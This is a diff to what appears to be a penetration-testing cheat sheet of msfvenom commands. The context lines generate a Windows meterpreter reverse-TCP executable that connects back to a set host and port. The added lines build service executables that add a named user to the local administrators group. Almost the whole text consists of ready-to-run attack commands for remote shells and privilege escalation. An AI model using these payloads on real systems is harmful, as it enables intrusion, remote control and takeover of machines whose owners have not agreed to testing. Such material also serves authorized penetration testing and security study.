@@ -14,7 +14,10 @@ myip=127.0.0.1
 port=3232
 msfvenom -p windows/meterpreter/reverse_tcp lhost=$myip lport=$port -f exe -o rev3232.exe
 ```
-
+```sh
+msfvenom -p windows/exec CMD='net localgroup administrators {user} /add' -f exe-service -o {p4yl04d.exe}
+msfvenom -p windows/exec CMD='net localgroup administrators bitbucket /add' -f exe-service -o Zero.exe
+```
 ### Capture 32 vs 64 bit (exploit/multi/handler) in One Liner
 https://github.com/andrewjkerr/security-cheatsheets/blob/master/metasploit
 ```sh
